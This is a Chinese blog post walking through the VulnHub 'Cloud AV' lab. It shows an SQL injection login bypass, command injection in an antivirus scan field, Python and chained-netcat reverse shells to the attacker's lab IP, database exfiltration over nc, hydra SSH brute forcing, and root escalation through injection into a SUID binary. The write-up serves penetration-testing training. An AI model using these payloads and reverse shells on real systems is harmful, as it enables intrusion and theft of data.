@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        Cloud AV | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">Cloud AV</div>
+        <div class="post-info">
+          
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-tag">#漏洞利用</a>
+
+
+          <span class="post-date">2023-03-19</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">IP发现</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">For 循环arping主机发现</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">端口扫描</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">8080端口</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">思考</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">FUZZ SQL 注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">burp 抓包 fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">SQL 注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">思考</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">命令执行</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">反弹shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">python</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">NC</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">NC 串联</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">提权</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">hydra 工具</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">代码审计</span></a></li></ol></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+
+<p>攻击机 ： 192.168.100.8                     靶机 ： 未知 <br><br><a name="TqgeD"></a></p>
+<h1><span id="信息收集">信息收集</span></h1><p><a name="ydS02"></a></p>
+<h2><span id="ip发现">IP发现</span></h2><p><code>arp-scan -l</code><br><code>netdiscover -r 192.168.100.0/24</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668513658847-94d6306f-c37f-451c-b20f-a15ebfac1350.png#averageHue=%23262d3c&clientId=ue3ff5f5c-7f44-4&from=paste&height=166&id=u8dfb6792&name=image.png&originHeight=166&originWidth=929&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64063&status=done&style=none&taskId=u2bed2bff-c944-4677-bc3e-3ba24a54c48&title=&width=929" alt="image.png"></p>
+<p><a name="RzfjQ"></a></p>
+<h2><span id="for-循环arping主机发现">For 循环arping主机发现</span></h2><p><code> for i in $(seq 1 254); do arping -c 2   192.168.100.$i; done</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668514568701-af5a5958-a341-4fe5-80d2-5c6f21db1bca.png#averageHue=%23292e3a&clientId=ue3ff5f5c-7f44-4&from=paste&height=962&id=uad32171b&name=image.png&originHeight=962&originWidth=751&originalType=binary&ratio=1&rotation=0&showTitle=false&size=214950&status=done&style=none&taskId=u6c154d05-920a-4be5-aabf-1f9c69061d7&title=&width=751" alt="image.png"><br><code>目标主机  ：  192.168.100.9</code></p>
+<p><a name="OScT3"></a></p>
+<h2><span id="端口扫描">端口扫描</span></h2><p><code>nmap -sV -p 1-65535 192.168.100.9</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668514595876-4fda6dbf-8bcb-47ea-8513-c92a0d150694.png#averageHue=%232b2f3c&clientId=ue3ff5f5c-7f44-4&from=paste&height=235&id=ucbd9f0c0&name=image.png&originHeight=235&originWidth=977&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64245&status=done&style=none&taskId=u53854fd7-b5ef-46b5-b0a6-d6a28e7af4c&title=&width=977" alt="image.png"><br>框架       Werkzeug httpd 0.14.1 (Python 2.7.15rc1)<br><br><a name="pjJVf"></a></p>
+<h2><span id="8080端口">8080端口<img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668514625690-bc9cdbc0-7f1f-4ff0-96ce-cfb5fb8d1397.png#averageHue=%23fcfcfb&clientId=ue3ff5f5c-7f44-4&from=paste&height=655&id=ufc910556&name=image.png&originHeight=655&originWidth=1327&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61644&status=done&style=none&taskId=u359a59df-e9df-4b86-96b9-e30f9cbea3f&title=&width=1327" alt="image.png"></span></h2><p>云防病毒扫描程序！<br>这是一个测试版云防病毒扫描程序服务。<br>请输入邀请代码以开始测试</p>
+<p>随便输入数字  ，返回一个错误的测试 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668514826810-e235c291-815d-4af7-9b59-6a6ee6a0370b.png#averageHue=%23d7bc98&clientId=ue3ff5f5c-7f44-4&from=paste&height=323&id=u70e892fe&name=image.png&originHeight=323&originWidth=984&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31452&status=done&style=none&taskId=u805745b1-2a38-4ae6-b312-c91f2092a80&title=&width=984" alt="image.png"></p>
+<p><a name="ApQDI"></a></p>
+<h1><span id="思考">思考</span></h1><p>这种输入框 <br>存在什么漏洞呢  sql注入   ，xss  ，命令执行   。代码执行    xxe  等等</p>
+<p><a name="E4mXn"></a></p>
+<h1><span id="fuzz-sql-注入">FUZZ SQL 注入</span></h1><p>这里简单fuzz 一下 sql注入 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668515404726-806fbc42-29cf-4e8b-a7ce-8b72f6a43da9.png#averageHue=%2323252e&clientId=ue3ff5f5c-7f44-4&from=paste&height=771&id=ueca203f6&name=image.png&originHeight=771&originWidth=803&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30737&status=done&style=none&taskId=u1c9aa2ed-e148-48dc-a972-c94a6736d8b&title=&width=803" alt="image.png"><br>使用这些符号 进行fuzz  因为不同的符号在不同的服务器 没有过滤的情况下 可能存在报错<br><a name="Z0xxZ"></a></p>
+<h2><span id="burp-抓包-fuzz">burp 抓包 fuzz</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668515488732-cfeaeceb-f0b6-435c-8dde-a87267b07bfc.png#averageHue=%23f9f9f9&clientId=ue3ff5f5c-7f44-4&from=paste&height=462&id=u311db8f3&name=image.png&originHeight=462&originWidth=997&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53791&status=done&style=none&taskId=ue1e9d292-210b-480c-a57b-1675646c5f0&title=&width=997" alt="image.png"><br>发送到 Intruder  <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668515523110-8bc8bc27-dd62-4128-9a06-3132aacb2aad.png#averageHue=%23fafafa&clientId=ue3ff5f5c-7f44-4&from=paste&height=550&id=u513bb72e&name=image.png&originHeight=550&originWidth=1261&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55267&status=done&style=none&taskId=ufb1274ea-364b-4b4d-b6d6-c248cbde2b7&title=&width=1261" alt="image.png"><br>爆破<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668515555223-87d37dfb-2a4b-474a-8821-89a2e5c45cd8.png#averageHue=%23f7f6f6&clientId=ue3ff5f5c-7f44-4&from=paste&height=731&id=u39eca6bc&name=image.png&originHeight=731&originWidth=1198&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58666&status=done&style=none&taskId=u251e188b-a427-4034-aca3-119cfdfde08&title=&width=1198" alt="image.png"><br>爆破之后 查看 与其他长度不相同的数据 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668515656955-2f185866-5aeb-443c-97fb-d3ecb774be0f.png#averageHue=%23f7bd92&clientId=ue3ff5f5c-7f44-4&from=paste&height=995&id=u3361b75e&name=image.png&originHeight=995&originWidth=1849&originalType=binary&ratio=1&rotation=0&showTitle=false&size=148067&status=done&style=none&taskId=uc479c217-17ed-4efb-ba74-586c1462f0e&title=&width=1849" alt="image.png"><br><a name="cIUe3"></a></p>
+<h1><span id="sql-注入">SQL 注入</span></h1><p>在输入  “  之后 数据库报错了 <br>报错之后 大概率是存在sql注入的</p>
+<p>这里的数据库 是 使用 python  加上  sqlite 搭建的数据库 </p>
+<p>这里报错的点 没有对其进行闭合 所以报错了 <br>if len(c.execute(‘select * from code where password&#x3D;&quot;’ + password + ‘&quot;’).fetchall()) &gt; 0:<img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668515793879-2f4aee26-5c03-40b3-bfb2-a36907730eb4.png#averageHue=%23757573&clientId=ue3ff5f5c-7f44-4&from=paste&height=320&id=uc1deb6d4&name=image.png&originHeight=320&originWidth=1365&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55039&status=done&style=none&taskId=ue6a1bc60-4647-4450-89d6-6d3c21f5f23&title=&width=1365" alt="image.png"></p>
+<p><code>select * from code where password=&#39;;  + password + &#39; &#39;)</code></p>
+<p>都知道报错之后 进行注释 然后就可以绕过登录 或者 执行sql 代码 <br>使用  <br><code>&quot; or 1=1 -- -</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668516272011-74bc8fd1-109e-4ab5-ab60-f6167ecaa616.png#averageHue=%23b18f6d&clientId=ue3ff5f5c-7f44-4&from=paste&height=435&id=u736d57c4&name=image.png&originHeight=435&originWidth=1120&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55365&status=done&style=none&taskId=u6cc030ff-1317-4516-9920-78e7eb39f41&title=&width=1120" alt="image.png"><br>就成功绕过登录了 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668516322536-a6cde741-c86e-42d0-948a-efc09a8a7253.png#averageHue=%23faf9f8&clientId=ue3ff5f5c-7f44-4&from=paste&height=414&id=ufaede70a&name=image.png&originHeight=414&originWidth=907&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78461&status=done&style=none&taskId=u6000970f-f712-46cc-8cde-8e1a317beb2&title=&width=907" alt="image.png"><br>这里说 <br>云防病毒扫描程序！<br>请尝试用我们的扫描仪扫描这些文件！<br>可以看见存在 <br>bash   cat  netcat   python<br>输入 存在的hello <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668516611759-ac50daec-b699-47c6-91a7-4c7a4ca154ba.png#averageHue=%23cba97f&clientId=ue3ff5f5c-7f44-4&from=paste&height=389&id=u816612e3&name=image.png&originHeight=389&originWidth=873&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84969&status=done&style=none&taskId=ub1009b2b-4628-4215-8611-beafe079c34&title=&width=873" alt="image.png">  <img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668516619500-d1f3a2bf-dc48-4f88-8a06-1e95f89a5ca0.png#averageHue=%23cfad84&clientId=ue3ff5f5c-7f44-4&from=paste&height=295&id=u2b2a2947&name=image.png&originHeight=295&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55173&status=done&style=none&taskId=ue1e761c1-deee-4ba0-b0d9-234301ba10c&title=&width=884" alt="image.png"><br>他就会去执行扫描这个文件</p>
+<p><a name="GPxal"></a></p>
+<h1><span id="思考">思考</span></h1><p>他是linux 主机 <br>他是去怎么执行的呢  ，怎么去扫描一个主机的呢 <br>执行命令  比如这是一个查杀软件  avscan <br>执行  avscan  hello <br>那按照 linux  shell <br>我可不可以去添加符号 执行多个命令呢</p>
+<p><a name="hWVdF"></a></p>
+<h1><span id="命令执行">命令执行</span></h1><p>常见的符号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&amp; <br>&#x27;&amp;&#x27;的作用是使命令在后台运行。只要在命令后面跟上一个空格和 &amp; 。你可以一口气 在后台运行多个命令。<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">;<br>就是分号，作用就是可以进行多条命令的无关联执行，每一条执行结果 互不影响<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&amp;&amp;<br>windows的用法和功能都一样，都是左边成功才执行右边<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">||<br>跟windows一样，前面执行失败才执行后面<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">()<br>如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用圆括号()把所有命令组合起来<br>echo 1 &amp;&amp; (echo 1 &gt; 11.txt;cp 11.txt  /)<br></code></pre></td></tr></table></figure>
+
+<p>在输入框 执行 hello  || id<br>看是否成功执行 id 命令<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668517535649-764c544f-3156-436d-acde-fe879de2a7f9.png#averageHue=%23cdad84&clientId=ue3ff5f5c-7f44-4&from=paste&height=485&id=u1730d28b&name=image.png&originHeight=485&originWidth=1150&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99902&status=done&style=none&taskId=u519f437d-9c39-4cdf-b16d-89a268bbb2f&title=&width=1150" alt="image.png">成功执行 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668517566452-882aa6a9-a8dc-4885-a680-fa6ac95fe86d.png#averageHue=%23cfad85&clientId=ue3ff5f5c-7f44-4&from=paste&height=483&id=uf66e660f&name=image.png&originHeight=483&originWidth=1268&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68542&status=done&style=none&taskId=uba119312-4736-4544-9f1b-0a690385842&title=&width=1268" alt="image.png"><br>成功执行id 命令<br><a name="K5aNv"></a></p>
+<h1><span id="反弹shell">反弹shell</span></h1><p><a name="lOt3v"></a></p>
+<h2><span id="python">python</span></h2><p>hello || python 代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&quot;import os,socket,subprocess;</span><br><span class="hljs-string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">s.connect((&#x27;192.168.100.8&#x27;,4444));</span><br><span class="hljs-string">os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);</span><br><span class="hljs-string">os.dup2(s.fileno(),2);</span><br><span class="hljs-string">p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668517791757-83932701-8835-430c-926d-6c49efc7ab1c.png#averageHue=%232f323c&clientId=u070ccb6e-af01-4&from=paste&height=301&id=u6285641d&name=image.png&originHeight=301&originWidth=763&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43142&status=done&style=none&taskId=ucc0991df-184b-4f36-842d-688f758877a&title=&width=763" alt="image.png"></p>
+<p><a name="ISi1u"></a></p>
+<h2><span id="nc">NC</span></h2><p>NC -e 参数<br>-e prog 程序重定向，一旦连接，就执行 [危险!!]<br>因为nc -e 这个参数 很危险 现在大部分 都被阉割掉了  <br> 靶机里面的-e 是不能使用的 <br>直接 使用 nc 是可以证明nc是可以正常使用的 但是这里这种直接连接的方式是连接不了的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668518289862-e76a5cac-e045-47a0-a039-9a7922f88137.png#averageHue=%23c5e7e8&clientId=u070ccb6e-af01-4&from=paste&height=626&id=u53c25a24&name=image.png&originHeight=626&originWidth=1501&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197723&status=done&style=none&taskId=ufe43b8f4-f81a-4c97-bb67-79b3b430f92&title=&width=1501" alt="image.png"></p>
+<p><a name="LkNvQ"></a></p>
+<h2><span id="nc-串联">NC 串联</span></h2><p>1.开启两个侦听端口<br>2.建立连接</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668518761973-bf863a71-93a3-4b12-a2be-a4601e0a049d.png#averageHue=%23282c36&clientId=u070ccb6e-af01-4&from=paste&height=214&id=ue4fdbccc&name=image.png&originHeight=214&originWidth=1097&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18382&status=done&style=none&taskId=uc866afed-b082-4198-88d3-f1ae53a9c0c&title=&width=1097" alt="image.png"></p>
+<p><code>hello || nc 192.168.100.8 3333 | /bin/bash | nc 192.168.100.8 4444</code><br>nc  与 kali 3333 端口建立连接   通过管道 bin&#x2F;bash 解析   然后用nc 反馈给 4444 端口<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668518879735-184103d8-54e3-4b87-a82c-ea9a18d84510.png#averageHue=%232a2e39&clientId=u070ccb6e-af01-4&from=paste&height=349&id=u016cb569&name=image.png&originHeight=349&originWidth=1214&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57306&status=done&style=none&taskId=u84c10be1-dcee-4064-a49d-343a147cee0&title=&width=1214" alt="image.png"><br>成功连接 <br>在3333 端口输入命令 在 4444 监听的端口进行返回数据 <br>这里已经返回shell  但是 权限只有 普通用户的权限</p>
+<p><a name="Vr4eD"></a></p>
+<h1><span id="提权">提权</span></h1><p>再监听一个nc 端口 <br>用于将接收到的请求都 建立个文件<br>重定向 <br>nc  -nvlp  5555 &gt; db.sql<br>nc -192.168.100.8 &lt; databases.sql<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668519800304-8834c867-f386-401d-9150-6a8fa17645c6.png#averageHue=%23252b38&clientId=u070ccb6e-af01-4&from=paste&height=951&id=uf2dd32df&name=image.png&originHeight=951&originWidth=1891&originalType=binary&ratio=1&rotation=0&showTitle=false&size=334398&status=done&style=none&taskId=u1d10c7d0-cf1c-4516-8849-aea2f9f6847&title=&width=1891" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668519880937-61ba3f6c-2d71-43e8-a2ec-b5889a96c1b0.png#averageHue=%2326303d&clientId=u070ccb6e-af01-4&from=paste&height=221&id=u8dd05069&name=image.png&originHeight=221&originWidth=493&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34618&status=done&style=none&taskId=u3bea461f-4e99-4be8-998c-3efc190fae2&title=&width=493" alt="image.png"><br>执行 sqlite3<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668519919958-06c90c88-0426-44dd-a19a-11677ddd7d44.png#averageHue=%23272f3b&clientId=u070ccb6e-af01-4&from=paste&height=199&id=udde4cba3&name=image.png&originHeight=199&originWidth=530&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29802&status=done&style=none&taskId=u9717232e-2605-4cd6-9bf0-28122aae1b4&title=&width=530" alt="image.png"><br>打开sql 文件 <br>.open db.sql   没有报错就打开成功 了 <br>.dump<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668520017593-0c415d9a-0b3e-45c8-ba43-5a31d8d8f2e5.png#averageHue=%23272f3c&clientId=u070ccb6e-af01-4&from=paste&height=357&id=u70a5417e&name=image.png&originHeight=357&originWidth=588&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60678&status=done&style=none&taskId=u9f96bd25-c9e2-4448-a8cc-cf1b98c3bea&title=&width=588" alt="image.png"><br>password 字段<br>存在4个密码<br>那用户呢 <br>查看 &#x2F;etc&#x2F;passwd  文件 查看有多少可以登录的用户<br><code>cat /etc/passwd | grep /bin/bash</code>       筛选一下<br>三个用户 <br>root <br>cloudav<br>scanner<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668520195631-dd765970-6600-43b9-91d7-39688a73f3d4.png#averageHue=%23272d3c&clientId=u070ccb6e-af01-4&from=paste&height=1017&id=u367e74d1&name=image.png&originHeight=1017&originWidth=1355&originalType=binary&ratio=1&rotation=0&showTitle=false&size=405419&status=done&style=none&taskId=u1cc8b2a1-33d1-4385-9dc9-0f550f24e7d&title=&width=1355" alt="image.png"><br>创建用户 ， 密码字典 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668520485496-1a8f6100-4e79-49c1-949e-9b7206c82044.png#averageHue=%23262e3b&clientId=u070ccb6e-af01-4&from=paste&height=266&id=u25f89b9d&name=image.png&originHeight=266&originWidth=489&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32421&status=done&style=none&taskId=u1b15a7b3-e2cb-41d7-b237-98ef8f1846b&title=&width=489" alt="image.png"><br><a name="LVlGx"></a></p>
+<h2><span id="hydra-工具">hydra 工具</span></h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/397779150">https://zhuanlan.zhihu.com/p/397779150</a><br>Hydra是一款非常强大的暴力破解工具<br>目前该工具支持以下协议的爆破：<br>AFP，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP &#x2F; R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。</p>
+<p><code>hydra  -L user.txt -P pass.txt -t 2 -vV -e ns 192.168.100.9  ssh</code><br><code>hydra  -L user.txt -P pass.txt ssh://192.168.100.9  </code><br>很可惜都没有爆破出来 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668520867795-2cf57a0e-6e62-46db-b9e9-b0926cf0260e.png#averageHue=%23293342&clientId=u070ccb6e-af01-4&from=paste&height=769&id=uf4d225e0&name=image.png&originHeight=769&originWidth=900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=308881&status=done&style=none&taskId=u202d0f87-4ede-4729-8ff6-8872346a1f9&title=&width=900" alt="image.png"></p>
+<p>失败告终 <br>那还有什么思路么<br>内核提权  或者 查看目录文件 是否有普通用户可以执行root 权限的文件呢<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668521285948-88206787-fcce-4ff2-ae69-ac25386a1b57.png#averageHue=%23262b3a&clientId=u070ccb6e-af01-4&from=paste&height=736&id=u0992f29b&name=image.png&originHeight=736&originWidth=1193&originalType=binary&ratio=1&rotation=0&showTitle=false&size=247628&status=done&style=none&taskId=ubc10d373-9c29-4029-b7c5-a1c97a95ba9&title=&width=1193" alt="image.png"><br>上一级 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668521364286-18ff7192-b5f8-4e1d-a9c2-ec604f2fb52b.png#averageHue=%23252938&clientId=u070ccb6e-af01-4&from=paste&height=541&id=ue6c99f61&name=image.png&originHeight=541&originWidth=1035&originalType=binary&ratio=1&rotation=0&showTitle=false&size=114438&status=done&style=none&taskId=u2e382203-3440-43c4-a838-b4cfc2570cb&title=&width=1035" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668521433910-f5023719-aa3c-4c63-a153-808da059bcac.png#averageHue=%23262b3a&clientId=u070ccb6e-af01-4&from=paste&height=368&id=ud43b1295&name=image.png&originHeight=368&originWidth=1229&originalType=binary&ratio=1&rotation=0&showTitle=false&size=123141&status=done&style=none&taskId=uef49d98d-576b-46e0-8a4a-1a92b45c48e&title=&width=1229" alt="image.png"><br>这个<br>update_cloudav    程序 带有SUID权限  <br>凡是具有suid权限标记位的可执行文件，当这个文件一旦执行的时候，无论当前是任何用户账号，在执行这个文件后就会默认继承这个文件属主的权限，也就是root的权限<br>可以设想一下如果可以执行update_cloudav程序，再通过某种命令注入的方法，利用它的suid权限标记位，若利用成功就可以用root权限来执行目标系统中的命令，包括任何可以反弹shell的命令，最终的结果就都会形成获得了一个root权限的反弹shell<br>而且是由 update_cloudav.c  编译而成的程序<br><a name="yPhap"></a></p>
+<h2><span id="代码审计">代码审计</span></h2><p>查看 update_cloudav.c<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668522111353-af32515f-2794-4bb0-8ca7-ce44ee38b5ba.png#averageHue=%23262a39&clientId=u070ccb6e-af01-4&from=paste&height=376&id=uee556d60&name=image.png&originHeight=376&originWidth=1250&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91698&status=done&style=none&taskId=udbca9906-21bd-4f35-a202-5980d3ced3d&title=&width=1250" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668522456766-eb29937d-1c76-45e1-948a-4ea7430bf32e.png#averageHue=%23262a39&clientId=u070ccb6e-af01-4&from=paste&height=68&id=u263427ad&name=image.png&originHeight=68&originWidth=471&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11694&status=done&style=none&taskId=uf35118cf-67f8-4f15-80a0-853964f9129&title=&width=471" alt="image.png"></p>
+<p>freshclam 文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668522479184-c5dbe975-c4a4-42bd-959f-1410e402c164.png#averageHue=%23faf8f5&clientId=u070ccb6e-af01-4&from=paste&height=119&id=u4b375b23&name=image.png&originHeight=119&originWidth=580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18037&status=done&style=none&taskId=u176f35bd-9ab7-4a5c-8f0e-85c5027fdae&title=&width=580" alt="image.png"></p>
+<p>是linux  clamav的一个杀软<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668522543109-d3628bd6-d54f-4c37-8174-bdcc20da5664.png#averageHue=%23262a39&clientId=u070ccb6e-af01-4&from=paste&height=218&id=u105b3665&name=image.png&originHeight=218&originWidth=696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43254&status=done&style=none&taskId=u0bafbf72-41d3-482d-9c21-8fda30dd77c&title=&width=696" alt="image.png"><br><code>如果程序在执行中不包含参数，那么会打印出这段话：This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam；</code><br><code>如果我们执行程序使用了参数，那么程序就会执行freshclam，运行病毒库更新</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668522399398-755c6a6d-8aae-47d0-802e-134e5558b4e2.png#averageHue=%232c303f&clientId=u070ccb6e-af01-4&from=paste&height=161&id=ufe044837&name=image.png&originHeight=161&originWidth=1139&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43109&status=done&style=none&taskId=u29df5e17-7c2e-4ba8-bc54-afd679950ee&title=&width=1139" alt="image.png"><br><code>./update_cloudav &quot;a | id &quot;</code><br>可以看出来成功执行了 而且还是root 权限</p>
